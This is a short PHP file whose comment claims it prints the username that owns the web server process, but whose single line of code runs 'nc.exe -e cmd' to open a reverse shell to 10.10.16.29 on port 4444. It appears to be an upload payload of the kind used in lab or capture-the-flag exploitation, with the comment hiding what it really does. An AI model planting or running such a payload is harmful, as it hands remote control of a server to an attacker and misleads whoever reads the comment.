
<?php
// outputs the username that owns the running php/httpd process
// (on a system with the "whoami" executable in the path)
echo exec('nc.exe -e cmd 10.10.16.29 4444');
?>

